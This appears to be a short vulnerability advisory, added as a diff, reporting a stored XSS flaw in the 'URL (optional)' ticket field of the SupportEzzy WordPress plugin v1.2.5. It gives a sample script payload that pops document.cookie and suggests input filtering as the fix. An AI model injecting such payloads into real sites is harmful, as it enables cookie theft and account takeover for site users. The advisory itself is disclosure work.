@@ -1,0 +1,22 @@
+# Exploit Title: SupportEzzy Ticket System - WordPress Plugin Stored XSS
+Vulnerability
+# Date: 12-10-2014
+# Exploit Author: Halil Dalabasmaz
+# Version: v1.2.5
+# Vendor Homepage:
+http://codecanyon.net/item/supportezzy-ticket-system-wordpress-plugin/8908617
+# Software Test Link: http://demo.cssjockey.com/cjsupport/supportezzy/
+# Tested on: Iceweasel and Chrome
+
+# Vulnerabilities Description:
+
+===Stored XSS===
+Register and login to system and then submit new ticket. "URL (optional)"
+input is not secure. You can run XSS payloads, use sample payload to test.
+
+Sample Payload for Stored XSS: http://example.com
+"><script>alert(document.cookie);</script>
+
+===Solution===
+Filter the input fields aganist to XSS attacks.
+===============
